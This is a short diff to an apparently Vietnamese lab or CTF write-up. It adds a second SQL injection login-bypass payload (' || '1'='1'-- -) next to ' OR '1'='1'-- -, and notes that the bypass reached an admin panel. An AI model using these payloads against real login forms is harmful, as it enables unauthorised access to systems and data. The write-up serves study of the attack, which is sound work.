@@ -18,6 +18,11 @@
   ```sql
   ' OR '1'='1'-- -
   ```
+* Hoặc
+
+  ```sql
+  ' || '1'='1'-- -
+  ```
 * Thành công bypass và vào được **admin panel**.
 
 ---
